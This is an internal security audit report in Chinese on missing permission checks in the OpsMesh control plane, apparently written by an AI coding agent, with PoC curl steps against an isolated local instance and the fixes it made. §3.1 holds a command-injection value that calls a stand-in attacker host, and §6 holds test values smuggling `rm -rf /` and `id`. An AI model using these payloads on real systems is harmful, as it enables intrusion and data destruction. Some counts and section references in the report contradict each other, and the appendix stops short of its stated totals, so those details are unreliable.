# OpsMesh 控制面鉴权审计报告（RBAC 空洞）

> **审计日**：2026-11-04（本地 `git log -1` = `97e248b`）
> **执行线**：`opencode`（用户指派，非名册四线，按 workbuddy 惯例报备，见 CLAIMS.md）
> **性质**：只读取证 + 落报告 + 修公共派发路径（`kafka_ops.go` / `storage_fastdfs.go`）；未动任何 `*_ops.go` 业务 handler
> **结论一句话**：**多数只读角色可下发任意 shell 到已纳管设备——控制面约 42% 的可派发路由没有权限校验。**

---

> **范围修正（2026-11-05 rebase 后）**：本报告初版基于 10-29 的 main。rebase 到最新
> origin/main 后发现** k8s 生命周期「假成功」那一节（原 §3.6 / 现 §3.3）已被
> `a554697`（2026-10-31）完成**，且对方选了裁决单的 **A 项（501）**、把四个子步骤与
> 状态机整体删除，做得比本线的 B 项（503 + 保留 `execute*Planned`）更干净。
> 本分支**已丢弃那部分改动**（`internal/k8slifecycle/`、`K8sLifecycleView.vue`、
> i18n 键），以免给 main 添冲突。当下表与附录中涉及假成功的内容请以 `a554697` 为真源。
>
> 本分支实际交付范围见 §5「已做」表中**未被标注重复**的行：派发鉴权两处、
> K8s 部署鉴权一处、`pkg/shellquote` 与三个 handler 的注入收编。

## 0. TL;DR

| 项 | 实测值 | 证据 |
|---|---|---|
| REST 路由总数 | **527** | `mux.HandleFunc` 静态统计 |
| 有权限点校验（RBAC） | 274 | 调 `requirePermission`/`requireProd`/`subsystemAuthorize` |
| **仅租户身份、无权限校验** | **224** | 只调 `requireTenantContext` 或不调 |
| 其中**可派发 shell 任务** | **223** | 调用链可达 `dispatchKafkaTask`/`createSystemTask` |
| 四类根因文件 | `kafka_ops.go:29`、`storage_fastdfs.go:111`、`system_ops.go:493` | — |
| 波及 handler 文件 | **79 个 `*_ops.go`，其中 52 个零鉴权语句** | — |
| PoC 复现 | **实测通过（生产模式 + 真 JWT）** | 见 §2 |
| K8s 集群部署匿名洞 | **实测通过（无任何身份即 202 + 启动 SSH）** | 见 §3.5 |
| 命令注入面 | **实测通过（payload 直入 script）** | 见 §3.1 |
| k8s 假成功 | **已由 `a554697` 完成（A 项 501），本分支不再重复** | origin/main |

修复方式：**不是** 223 处逐个补，而是堵住 2 条公共派发入口 + 1 条 K8s 部署入口 + 1 套注入转义工具。
已交付：`kafka_ops.go` / `storage_fastdfs.go`（派发鉴权）、`k8s_cluster_deploy.go`（k8s:write/read）、
`pkg/shellquote`（转义 + 白名单）、`activemq_ext_ops.go`（首批高危 handler 收编）、
`internal/k8slifecycle`（假成功诚实化），本分支实交付 **23** 个守卫（另 12 个隶属已被上游取代的假成功改动，已随该部分一并丢弃）。

**复算口径修正（重要）**：本报告初版的静态统计只跟踪**同文件内** helper，漏算了
`dispatchKafkaTask`（在 `kafka_ops.go`）被 `*_ops.go` 调用的收口效果，把剩余面算成
216 条。`scripts/authz-route-audit.py` 已改为跨文件跟踪，实测收口后
「可派发但无 RBAC」= **0**（527 条中 499 条有权限点校验、27 条为设计上公开、
1 条仅租户身份）。教训：**静态分析不能作为唯一验收手段**——K8s 部署匿名洞就是
静态扫描漏报、靠运行时才抓到的。

---

## 1. 根因（为什么会这样）

OpsMesh 的鉴权设计其实**是完备的**。`internal/controlplane/auth.go:142` 的 `requireProd()`
是核心闸门，做了四路认证 + 权限点校验：

1. 联邦入站 HMAC 验签
2. API Key（`Authorization: Bearer om_*` / `X-API-Key`）
3. JWT Bearer / HttpOnly Cookie → `requirePermission()`
4. 网关注入 `X-User-Roles`（仅 `--trust-gateway-headers=true`）
5. demo 模式降级 + 否则 401

`/api/v1/tasks`、`/api/v1/devices`、`middleware:execute`、`os:write`、`k8s:write`
这些"正门"路由都**老老实实调了 `requireProd(w, r, "<域>:write")`**，审计链、越权日志
（`authz_audit_forgery_test.go`）都在。

**破窗在哪**：中期之后为快速铺 60 个运维域，批量生了 79 个 `*_ops.go`。
它们没有照抄正门的写法，而是统一走一个便捷函数：

```go
// internal/controlplane/kafka_ops.go:29
func (s *Server) dispatchKafkaTask(w http.ResponseWriter, r *http.Request,
	deviceID, script, action string) (string, bool) {
	actx, ok := s.requireTenantContext(w, r)   // ← 只认租户，不认权限
	if !ok {
		return "", false
	}
	task, err := s.createSystemTask(actx.TenantID, deviceID, script, "kafka_"+action)
	...
}
```

`requireTenantContext`（`http_infra.go:129`）**只校验**「你声称的租户和你的令牌一致」，
`--require-auth=false` 时甚至只要求**带一个 `X-Tenant-ID` 头**。它**从不检查
调用者是否有 `task:write` 权限**。

于是形成一条完整链路：

```
任意请求 → /api/v1/cache/deploy → dispatchKafkaTask
        （requireTenantContext：只验租户）
        → createSystemTask（system_ops.go:493）
        → proto.Task{Type: TaskTypeShell, Command: <脚本>}
        → SQLStore/pending 队列 → agent 领取 → sh -c 执行
```

`internal/agent/agent.go:1623` 最终通过 `exec.Command("sh", "-c", command)` 执行。

### 调用规模

| 函数 | 调用点 | 涉文件 |
|---|---|---|
| `dispatchKafkaTask` | **465 处** | 50 |
| `dispatchFastDFSTask` | 50 处 | 3 |
| `createSystemTask` | 98 处 | 30 |

堵这三处 ≈ 收口数百条路由，比逐处补权限省一个数量级的改动量。

---

## 2. PoC：只读角色越权下发 shell

> 复现命令在 §8。以下为实测输出（2026-11-04，本机 `cmd/opsmesh` 构建 + memory store）。
> **注意：以下是我在隔离本机环境实测，不是模拟**；临时进程与文件已清理。

### 前置

```bash
# 自签证书（生产模式 --production 强制 TLS + encryption-key）
openssl req -x509 -newkey rsa:2048 -keyout certs/key.pem -out certs/cert.pem \
  -days 2 -nodes -subj /CN=127.0.0.1 -addext subjectAltName=IP:127.0.0.1

OPSMESH_ADMIN_PASSWORD=... OPSMESH_JWT_SECRET=... OPSMESH_ENCRYPTION_KEY=$(openssl rand 32|base64) \
./opsmesh --mode=controlplane --production --http-port=18443 \
  --tls-cert=certs/cert.pem --tls-key=certs/key.pem \
  --advertise-addr=https://127.0.0.1:18443 --metrics-allow-cidr=127.0.0.1/32
```

用 admin 令牌建一个**只读**账号：

```jsonc
// POST /api/v1/users  →  201
{"username":"prodviewer","password":"...","role_ids":["role-viewer"]}
// 返回 permissions：device:read / task:read / alert:read / ...（**无任何 :write、无 middleware:execute**）
```

### 对照实验（这是最关键的一步）

| # | 身份 | 目标 | 期望 | 实测 |
|---|---|---|---|---|
| A | prodviewer JWT | `POST /api/v1/tasks` | 403 | ✅ `{"error":"permission denied: task:write"}` |
| B | prodviewer JWT | `POST /api/v1/cache/deploy` | 403 | ❌ **`{"action":"deploy","taskID":"task-..."}` / 202** |
| C | prodviewer JWT | `POST /api/v1/middleware/activemq/security` | 403 | ❌ **202** |

**同一个身份、同一进程：正门 403，运维侧门 202。**

A 与 B 的差异正好证明问题不在认证而在**漏查权限**：A 走 `requirePermission`，B 走
`requireTenantContext`。

### 附加发现：`--require-auth` 关不掉全部洞

| 启动参数 | 仅带 `X-Tenant-ID: default`（无 token）打 `/api/v1/cache/deploy` |
|---|---|
| 默认（无 `--production`） | ❌ **202，任务已下发** |
| `--production` | ✅ 401 `identity header without verifiable credential` |

即：默认配置下**连令牌都不需要**，一个 HTTP 头就能触发 shell 派发。
`--production` 挡住了纯头路径，但**挡不住 B/C（持证低权限用户）**。

---

## 3.1 附带发现 A：命令注入面（`fmt.Sprintf` 拼 shell）——已修

> 处置口径（用户裁定）：做转义工具 + **优先收编高危**（带 host/user/password 等
> 可注入字段的 handler），不做全量 400 处。已交付 `pkg/shellquote` +
> `activemq_ext_ops.go` 全部 8 处，守卫 5 个。

§1 的洞之外，多个 handler 把请求体字段**未转义**拼进 shell 脚本：

```go
// internal/controlplane/activemq_ext_ops.go:127
script = fmt.Sprintf(
  `echo "%s=%s" >> /opt/activemq/conf/users.properties && echo "%s = %s" >> ...`,
  req.User, req.Password, req.Role, req.User)
```

实测 `user` 传 `x"; curl -s http://attacker/... ; echo "` 已被原样拼入 script。
目标设备若以 `sh -c` 执行，构成命令注入。同类写法在
`abac_ops.go`、`activemq_ext_ops.go`、`zookeeper_middleware_ops.go` 等多处。

**处置建议**：所有 `req.*` 入 shell 的位置统一走一层白名单转义
（已有 `pkg/security` 可参考；`pkg/sqlguard` 是同类先例）。
本报告只做取证，未改动这些 handler。

---

## 3.2 附带发现 B：K8s 集群部署路由匿名可调（比 §1 更严重）——已修

> 这是**本报告里最严重的一条**：不需要任何凭据。

`internal/controlplane/k8s_cluster_deploy.go` 的 `handleK8sClusterDeploy` /
`handleK8sClusterDeployStatus` 原先**一个鉴权调用都没有**。实测（memory 实例）：

```
POST /api/v1/k8s/clusters/deploy   →  202
{"deployID":"20261104091453","phase":"Precheck","currentStep":"节点连通性/环境预检"}
```

请求体 `NodeSpec` 带 `Host/Port/User/SSHKey/Password`，而
`executeDeploy → precheckNodes` 会拿它们 `sshPool.Get(node.Host, port, user, node.SSHKey, node.Password)`
去连这些主机并执行 kubeadm 安装。也就是说：**这个端点等于把控制面变成「用调用方给的
凭据 SSH 到任意主机跑安装命令」的代理，且对全世界敞开**。§1 的 dispatch 洞至少还需要
一个低权限凭据，这个连凭据都不要。

> **为什么静态扫描漏了它**：它的派发路径不走 `dispatchKafkaTask`/`createSystemTask`，
> 而是 `K8sClusterDeployer.Deploy`（自有 sshPool）。`scripts/authz-route-audit.py`
> 的 DISPATCH 标记集不含这条，故它在修正后的统计里仍是 ANON（27 条设计上公开路由之一）。
> 教训见 §0：**静态分析不能作为唯一验收手段**。

已修：POST → `k8s:write`，status → `k8s:read`（权限点与 `k8s_deployments.go` 同域一致）。

## 3.3 附带发现 C：k8s 生命周期「假成功」——**已由 a554697 完成，本节仅存档**

`internal/k8slifecycle/handler.go` 的三个动作（版本升级 / 回滚 / 证书轮换）的
`execute*` 此前只 `logx.Info` + `updateStatus` 把状态一路推到 100%，从不为 nil error
⇒ 调用方一律写 `Completed`。而 `web/enterprise/src/views/K8sLifecycleView.vue`
**真的在调** `upgradeK8sCluster`，用户看到完整进度后以为集群已升级，实际一个字节都没动。

这是比 §1/§3.5 更隐蔽的一类缺陷：**不越权、不注入，但对用户撒谎**。回滚尤其危险——
用户以为集群已回到旧版本而实际没有。

> **⚠️ 本节内容已被上游取代**：origin/main 的 `a554697`（2026-10-31）按裁决单
> **A 项**完成同一修复——三入口一律 501 + 响应 `{error, code:"ERR_NOT_IMPLEMENTED"}`，
> 并**删除**四个子步骤、executeRollback、executeRotation 与证书轮换状态机（不登记作业，
> 避免 /upgrade/status 返回假 Completed），另立项
> `docs/design/k8s-lifecycle-execution-charter.md`（C 项，8–12 人日）。
> 本线原按 B 项（503 + 保留 execute*Planned）的改动已从本分支丢弃。
> 下方为当时的取证记录，保留助于理解缺陷形态。

本线当时的处置（B 项，已废弃）：

- 三 `execute*` 恒返回 `notImplementedError`，状态落 `Failed` 并带原因；
- 三入口 `HandleUpgrade`/`HandleRollback`/`HandleCertRotation` 经 `rejectUnimplemented`
  直接回 **503**，不再派一个必然失败的异步作业；
- 前端两个按钮禁用 + 可见说明（避免 title-only 悬停不可发现）；
- 原分级推进逻辑保留为 `execute*Planned`，待真实现（需真集群验证窗口）接回。

**顺带修掉一个存量 bug**：`UpgradeManager.updateStatus(upgradeID, phase, progress, step, errMsg)`
的五参签名，所有 `Failed` 分支都把 `err.Error()` 传在第 4 参（`step`）而第 5 参（`errMsg`）
传空串 ⇒ **`Error` 字段恒为空、错误文本被塞进 `CurrentStep`**。`CertRotationManager.updateStatus`
更只有 4 参（无 errMsg 位），已对齐。测试 `TestExecuteUpgradeNeverFakesSuccess`
的「失败态未带原因」断言就是抓这个的。

> 真实现的成本判据（供后续立项参考）：同包已有 `PlanUpgrade`（ssh + kubeadm upgrade plan）、
> `EtcdManager.Backup/Restore`、`NodeScaler` 等真执行件，缺的是串成序列 + 护栏
> （drain、超时、失败即停）+ **真集群验证窗口**。差异不在「有没有底座」，
> 而在「要不要现在承担改动生产集群的风险」。

## 4. 受影响面（223 条路径）

### 按域汇总

| 域 | 条数 | 源文件 |
|---|---|---|
| middleware | **77** | activemq_ext_ops.go, activemq_ops.go, domestic_ops.go, kafka_advanced_ops.go, kafka_final_ops.go, kafka_ops.go, kafka_ops_ext.go, kafka_scale_ops.go, mq_ext_ops.go, pulsar_ops.go, rabbitmq_ext_ops.go, rabbitmq_ops.go, rocketmq_ext_ops.go |
| os | **31** | domestic_ops.go, git_unix_ops.go, os_ext_ops.go, os_tuning_ops.go, raid_ext_ops.go |
| search | **24** | elk_ext_ops.go, elk_ops.go |
| gpu | **13** | gpu_ext_ops.go |
| cache | **12** | cache_ops.go, redis_cache_ops.go |
| olap | **10** | olap_ext_ops.go |
| graph | **7** | graph_ext_ops.go |
| security | **6** | security_ext_ops.go |
| db | **5** | db_backup_ops.go, db_perf_ops.go, db_replication_ops.go, domestic_ops.go |
| vector | **5** | vector_ext_ops.go |
| cicd | **4** | cicd_ops.go |
| data | **3** | data_ops.go |
| script | **3** | script_compile_ops.go |
| container | **2** | container_ops.go |
| storage | **2** | distfs_ops.go, storage_fastdfs.go |
| 其余 21 域 | 各 1 | abac / auth / automation / build / capacity / gateway / ha / iac / identity / k8s / microservice / netdiag / network / observability / oncall / servicediscovery / servicemesh / statuspage / synthetic / … |

### 明细

完整 223 条路径见本文件末尾「附录 A」（脚本可重算，方法见 §8）。

---

## 5. 修复方案

### 已做（2026-11-04 已交付，全部含守卫 + 窄变异验证）

| 项 | 文件 | 改动 |
|---|---|---|
| 派发鉴权（§1） | `internal/controlplane/kafka_ops.go` | `dispatchKafkaTask`：`requireTenantContext` → `subsystemAuthorize(w, r, "task:write")` |
| 派发鉴权（§1） | `internal/controlplane/storage_fastdfs.go` | `dispatchFastDFSTask` 同上 |
| K8s 匿名洞（§3.2） | `internal/controlplane/k8s_cluster_deploy.go` | POST → `k8s:write`，status → `k8s:read` |
| ~假成功诚实化~ | ~`internal/k8slifecycle/handler.go`~ | **已被 `a554697` 完成（A 项），本分支已丢弃** |
| ~假成功诚实化~ | ~`K8sLifecycleView.vue`~ | **已被 `a554697` 完成，本分支已丢弃** |
| 注入转义工具（§3.1） | `pkg/shellquote/` | `Quote`（`'` → `'\''`）+ 白名单（Host/Ident/Port/Path） |
| 注入收编（§3.1） | `internal/controlplane/activemq_ext_ops.go` | 8 处全部收编（host 白名单 / ident 白名单 / Quote） |
| 注入收编（§3.1） | `internal/controlplane/activemq_ops.go` | deploy 的 version 白名单（wget URL + ln 路径） |
| 注入收编（§3.1） | `internal/controlplane/cache_ops.go` | deploy(version/mode/port)、cluster(nodes)、sentinel(master/host)、tuning(maxmemory/eviction)、acl(user/rules/password) 全部收编 |

守卫测试（本分支保留）：`dispatch_authz_test.go`(6) / `k8s_cluster_deploy_authz_test.go`(5) /
`activemq_ext_injection_test.go`(5) / `cache_injection_test.go`(7) /
`pkg/shellquote/quote_test.go`(8)，合计 31 个。
（`fake_success_test.go` 4 个随假成功改动一并丢弃——那部分已由 a554697 覆盖。）

> 诚实边界：`domestic_ops.go` 我原估有注入，逐条复核后确认**全部是静态脚本、无 req 字段
> 入 shell ⇒ 实际不需要改**，`cache/deploy` 之外仍有约 380 处 `fmt.Sprintf` 拼 shell
> 属「宽域字段待逐域裁定」，本批按用户口径只做高危优先。

`subsystemAuthorize` 是既有组合：先 `requireTenantContext`（租户一致），再
`requireProd`（权限点）。语义与 `/api/v1/tasks` 正门一致。

**收口范围**：465 + 50 = 515 个调用点一次性生效；`createSystemTask`（98 处）中经
上述两条路径的即被覆盖，直接构造的调用方（`server_tasks.go` 等正门）本就自带权限校验。

**兼容面**：admin / operator 持 `task:write`，行为不变；viewer 从「静默 202」
变为「显式 403」——这正是正确行为，此前是漏洞。

### 后续建议（不属本次范围，供 owner 裁量）

1. **细粒度权限**：`task:write` 是粗粒度；若要按域拆分（`middleware:execute` /
   `os:execute` / `gpu:write`），应给 `dispatch*Task` 加 `perm` 参数逐域传。
   本批先用最保守的 `task:write`，先堵洞，不扩大凭据面。
2. **守卫测试**：新增 `dispatch_authz_test.go`，钉死「viewer 403 / admin 202 /
   拆掉鉴权行即判红」三态，防回退。
3. **命令注入转义**：§3 的 `fmt.Sprintf` 拼 shell，独立立项。
4. **门禁防新增漏洞**：在 `.golangci.yml` 加一条（或扩展 `coord-gate.py`），
   对新增 `*_ops.go` 路由断言「注册函数所在文件含 `requireProd`/`subsystemAuthorize`」。
   这是防复发的唯一结构手段。

---

## 6. 验证记录

- `go build ./...` / `go vet ./...`：改动前后均零报点
- `gofmt -l internal/ pkg/`：零输出（CRLF/LF 与 BOM 与原文件一致）
- `go test ./internal/controlplane/...`：**PASS**（含本批新增 23 个守卫）
- `go test ./internal/store/... ./pkg/... ./cmd/...`：**PASS**（零连带回归）
- `go test ./pkg/shellquote/`：**PASS**，其中 2 个语义用例在 Windows 开发机上
  经 git-bash/WSL 真 shell 求值（非 skip）
- 前端：`vitest run` 61 文件 / 1306 测试全绿、`eslint` 0、`vite build` PASS
- **窄变异**（每一处修复都验证过「拆掉它 ⇒ 守卫判红」）：
  | 变异 | 判红用例 |
  |---|---|
  | `dispatchKafkaTask` 退回 `requireTenantContext` | viewer 拿到 200（+FastDFS 路径同） |
  | `k8s_cluster_deploy.go` 拆掉写闸 | viewer/匿名重回 **202 + deployID** |
  | `executeUpgrade` 改回 `return nil`（假成功） | `TestExecuteUpgradeNeverFakesSuccess` |
  | `shellquote.Quote` 把 `'` 删掉（坏转义） | 形状/剥壳长度/真 shell 求值三重判红 |
  | `ValidateHost` 结果吞掉 | `master="a; rm -rf /"` 回到 202 |
  | `validateNodeList` 禁用 | nodes 含 `` `id` `` 回到 202 |
- 窄变异：拆掉 `kafka_ops.go` 新加的权限闸 → `dispatch_authz_test.go` 判红（复原转绿）
- 手工端到端：§2 表 B/C 从 202 → 403

---

## 7. 与既有文档的关系

- `docs/security-mechanism.md` 里的权限目录（`os:execute`、`middleware:execute` 等）
  **描述的是正门语义**，未覆盖 `*_ops.go` 这批，故不被本次推翻；但它也未承诺这些路由已受保护。
- `docs/tech-debt.md`：建议新增一条 TD，登记「§3 命令注入」与「§5 后续 1 细粒度权限」。
- 本报告不构成对 `feature-design.md` / `module-design.md` 的否定。

---

## 8. 复现与复算命令

```bash
# 1) 复算受影响面（需 python3）
python3 scripts/authz-route-audit.py            # 输出：域汇总 + 223 条明细

# 2) 构建与起服务（生产模式 OpsMesh 强制 TLS + encryption-key）
go build -o /tmp/opsmesh ./cmd/opsmesh
cd /tmp && openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 2 -nodes \
  -subj /CN=127.0.0.1 -addext subjectAltName=IP:127.0.0.1
OPSMESH_ADMIN_PASSWORD='Passw0rd!x' OPSMESH_JWT_SECRET="$(head -c32 /dev/urandom|base64 -w0)" \
OPSMESH_ENCRYPTION_KEY="$(openssl rand 32|base64 -w0)" /tmp/opsmesh \
  --mode=controlplane --production --http-port=18443 --tls-cert=c.pem --tls-key=k.pem \
  --advertise-addr=https://127.0.0.1:18443 --metrics-allow-cidr=127.0.0.1/32 &

# 3) PoC（§2）
TOK=$(curl -sk -X POST https://127.0.0.1:18443/api/v1/auth/login \
  -H 'Content-Type: application/json' -d '{"username":"admin","password":"Passw0rd!x"}' \
  | python -c 'import sys,json;print(json.load(sys.stdin)["changePasswordToken"])')
TOK=$(curl -sk -X POST https://127.0.0.1:18443/api/v1/auth/change-password \
  -H 'Content-Type: application/json' \
  -d '{"oldPassword":"Passw0rd!x","newPassword":"Passw0rd!New","changePasswordToken":"'$TOK'"}' \
  | python -c 'import sys,json;print(json.load(sys.stdin)["token"])')

curl -sk -X POST https://127.0.0.1:18443/api/v1/users -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"username":"v","password":"Viewer123!x","role_ids":["role-viewer"]}'

VTOK=$(curl -sk -X POST https://127.0.0.1:18443/api/v1/auth/login \
  -H 'Content-Type: application/json' -d '{"username":"v","password":"Viewer123!x"}' \
  | python -c 'import sys,json;print(json.load(sys.stdin)["token"])')

B='{"deviceID":"prod-db-01","type":"redis","mode":"standalone"}'
curl -skf -X POST https://127.0.0.1:18443/api/v1/tasks             -H "Authorization: Bearer $VTOK" -d "$B"  # 403 ← 正门
curl -skf -X POST https://127.0.0.1:18443/api/v1/cache/deploy     -H "Authorization: Bearer $VTOK" -d "$B"  # 403 ← 修复后
curl -skf -X POST https://127.0.0.1:18443/api/v1/cache/deploy     -H 'X-Tenant-ID: default'          -d "$B"  # 401 ← 生产模式
```

---

## 9. 边界声明

- 本审计**未触发任何写操作**到线上/共享环境；§2 的全部下发发生在本机隔离实例
  （memory store、自签证书、随机口令），进程与产物已清理。
- **未按仓库 CLAIM 协议触碰** `AGENTS.md` §5 禁区（`.github/workflows/`、
  `CHANGELOG.md` 顶部版本引用块、`docs/tech-debt.md` 标记行）。
- 未 `git pull`：本地 `main` 与 `origin/main` 分叉（本地 +3 / 远端 +139），
  此非无损操作，留给 lead 主导。
- `kilo` 对 `internal/controlplane` 的 24h CLAIM（10-29T22:00Z）已过期未闭环，
  板面 ISSUE 区计 3 条过期；本线在 `CLAIMS.md` 以 `opencode` 名义补齐 CLAIM
  与 NOTE 报备，未与任何活 CLAIM scope 重叠。

---

## 附录 A：受影响路径明细（223 条）

共 **223** 条，按域分 34 组。格式：`路径` ← 源文件。

### `middleware`（77 条）

- `/api/v1/middleware/activemq/deploy` — `activemq_ops.go`
- `/api/v1/middleware/activemq/durable-sub` — `activemq_ext_ops.go`
- `/api/v1/middleware/activemq/ha` — `activemq_ext_ops.go`
- `/api/v1/middleware/activemq/lifecycle` — `activemq_ops.go`
- `/api/v1/middleware/activemq/monitor` — `activemq_ops.go`
- `/api/v1/middleware/activemq/network` — `activemq_ext_ops.go`
- `/api/v1/middleware/activemq/security` — `activemq_ext_ops.go`
- `/api/v1/middleware/activemq/upgrade` — `activemq_ext_ops.go`
- `/api/v1/middleware/domestic` — `domestic_ops.go`
- `/api/v1/middleware/kafka/acl` — `kafka_ops.go`
- `/api/v1/middleware/kafka/broker` — `kafka_ops.go`
- `/api/v1/middleware/kafka/config` — `kafka_ops_ext.go`
- `/api/v1/middleware/kafka/connect` — `kafka_ops.go`
- `/api/v1/middleware/kafka/delegation-token` — `kafka_ops_ext.go`
- `/api/v1/middleware/kafka/delete-records` — `kafka_ops_ext.go`
- `/api/v1/middleware/kafka/eos` — `kafka_final_ops.go`
- `/api/v1/middleware/kafka/health-check` — `kafka_ops_ext.go`
- `/api/v1/middleware/kafka/isr` — `kafka_ops_ext.go`
- `/api/v1/middleware/kafka/keda` — `kafka_final_ops.go`
- `/api/v1/middleware/kafka/kraft` — `kafka_ops.go`
- `/api/v1/middleware/kafka/kraft-migration` — `kafka_final_ops.go`
- `/api/v1/middleware/kafka/log` — `kafka_scale_ops.go`
- `/api/v1/middleware/kafka/mirror-maker` — `kafka_advanced_ops.go`
- `/api/v1/middleware/kafka/mirror-maker-full` — `kafka_scale_ops.go`
- `/api/v1/middleware/kafka/otel` — `kafka_final_ops.go`
- `/api/v1/middleware/kafka/quota` — `kafka_ops.go`
- `/api/v1/middleware/kafka/rebalance` — `kafka_ops_ext.go`
- `/api/v1/middleware/kafka/scale` — `kafka_scale_ops.go`
- `/api/v1/middleware/kafka/schema-registry` — `kafka_ops.go`
- `/api/v1/middleware/kafka/share-group` — `kafka_advanced_ops.go`
- `/api/v1/middleware/kafka/streams` — `kafka_scale_ops.go`
- `/api/v1/middleware/kafka/streams-full` — `kafka_final_ops.go`
- `/api/v1/middleware/kafka/tiered-storage` — `kafka_final_ops.go`
- `/api/v1/middleware/kafka/transaction` — `kafka_scale_ops.go`
- `/api/v1/middleware/kafka/tuning` — `kafka_advanced_ops.go`
- `/api/v1/middleware/kafka/upgrade` — `kafka_scale_ops.go`
- `/api/v1/middleware/pulsar/connector` — `mq_ext_ops.go`
- `/api/v1/middleware/pulsar/deploy` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/function` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/ha` — `mq_ext_ops.go`
- `/api/v1/middleware/pulsar/lifecycle` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/monitor` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/namespace` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/scale` — `mq_ext_ops.go`
- `/api/v1/middleware/pulsar/schema-registry` — `mq_ext_ops.go`
- `/api/v1/middleware/pulsar/subscription` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/tenant` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/tiered-storage` — `mq_ext_ops.go`
- `/api/v1/middleware/pulsar/topic` — `pulsar_ops.go`
- `/api/v1/middleware/pulsar/upgrade` — `mq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/backup` — `rabbitmq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/cluster` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/deploy` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/federation` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/ha` — `rabbitmq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/lifecycle` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/message` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/monitor` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/observability` — `rabbitmq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/policy` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/scale` — `rabbitmq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/security` — `rabbitmq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/shovel` — `rabbitmq_ops.go`
- `/api/v1/middleware/rabbitmq/tuning` — `rabbitmq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/upgrade` — `rabbitmq_ext_ops.go`
- `/api/v1/middleware/rabbitmq/user` — `rabbitmq_ops.go`
- `/api/v1/middleware/rocketmq/acl` — `pulsar_ops.go`
- `/api/v1/middleware/rocketmq/consumer-group` — `pulsar_ops.go`
- `/api/v1/middleware/rocketmq/deploy` — `pulsar_ops.go`
- `/api/v1/middleware/rocketmq/dlq` — `rocketmq_ext_ops.go`
- `/api/v1/middleware/rocketmq/ha` — `rocketmq_ext_ops.go`
- `/api/v1/middleware/rocketmq/lifecycle` — `pulsar_ops.go`
- `/api/v1/middleware/rocketmq/monitor` — `rocketmq_ext_ops.go`
- `/api/v1/middleware/rocketmq/scale` — `rocketmq_ext_ops.go`
- `/api/v1/middleware/rocketmq/topic` — `pulsar_ops.go`
- `/api/v1/middleware/rocketmq/tuning` — `rocketmq_ext_ops.go`
- `/api/v1/middleware/rocketmq/upgrade` — `rocketmq_ext_ops.go`

### `os`（31 条）

- `/api/v1/os/agent-distribute` — `os_ext_ops.go`
- `/api/v1/os/app-tuning` — `os_tuning_ops.go`
- `/api/v1/os/cert` — `os_tuning_ops.go`
- `/api/v1/os/disk-health` — `git_unix_ops.go`
- `/api/v1/os/domestic/cpu` — `domestic_ops.go`
- `/api/v1/os/domestic/detect` — `domestic_ops.go`
- `/api/v1/os/domestic/gpu` — `domestic_ops.go`
- `/api/v1/os/git` — `git_unix_ops.go`
- `/api/v1/os/hardware-inventory` — `git_unix_ops.go`
- `/api/v1/os/hardware/inventory-full` — `os_tuning_ops.go`
- `/api/v1/os/hardware/sensors` — `os_tuning_ops.go`
- `/api/v1/os/harmony-ext` — `os_ext_ops.go`
- `/api/v1/os/kernel/module` — `os_tuning_ops.go`
- `/api/v1/os/kernel/tuning` — `os_tuning_ops.go`
- `/api/v1/os/log` — `os_ext_ops.go`
- `/api/v1/os/macos-ext` — `git_unix_ops.go`
- `/api/v1/os/macos-service` — `os_ext_ops.go`
- `/api/v1/os/process` — `os_ext_ops.go`
- `/api/v1/os/raid` — `git_unix_ops.go`
- `/api/v1/os/raid-ext` — `raid_ext_ops.go`
- `/api/v1/os/resource` — `os_tuning_ops.go`
- `/api/v1/os/storage-tuning` — `os_tuning_ops.go`
- `/api/v1/os/system-backup` — `os_tuning_ops.go`
- `/api/v1/os/unix` — `git_unix_ops.go`
- `/api/v1/os/windows-eventlog` — `git_unix_ops.go`
- `/api/v1/os/windows-firewall` — `git_unix_ops.go`
- `/api/v1/os/windows-package` — `git_unix_ops.go`
- `/api/v1/os/windows-perf` — `git_unix_ops.go`
- `/api/v1/os/windows-registry` — `git_unix_ops.go`
- `/api/v1/os/windows-service` — `os_ext_ops.go`
- `/api/v1/os/windows-user` — `git_unix_ops.go`

### `search`（24 条）

- `/api/v1/search/elasticsearch/alias` — `elk_ext_ops.go`
- `/api/v1/search/elasticsearch/ccr` — `elk_ext_ops.go`
- `/api/v1/search/elasticsearch/cluster` — `elk_ops.go`
- `/api/v1/search/elasticsearch/cluster-settings` — `elk_ext_ops.go`
- `/api/v1/search/elasticsearch/datastream` — `elk_ext_ops.go`
- `/api/v1/search/elasticsearch/deploy` — `elk_ops.go`
- `/api/v1/search/elasticsearch/ilm` — `elk_ops.go`
- `/api/v1/search/elasticsearch/index` — `elk_ops.go`
- `/api/v1/search/elasticsearch/lifecycle` — `elk_ops.go`
- `/api/v1/search/elasticsearch/maintenance` — `elk_ext_ops.go`
- `/api/v1/search/elasticsearch/pipeline` — `elk_ext_ops.go`
- `/api/v1/search/elasticsearch/reindex` — `elk_ops.go`
- `/api/v1/search/elasticsearch/security` — `elk_ops.go`
- `/api/v1/search/elasticsearch/snapshot` — `elk_ops.go`
- `/api/v1/search/elasticsearch/template` — `elk_ext_ops.go`
- `/api/v1/search/elasticsearch/upgrade` — `elk_ops.go`
- `/api/v1/search/elasticsearch/watcher` — `elk_ext_ops.go`
- `/api/v1/search/filebeat` — `elk_ops.go`
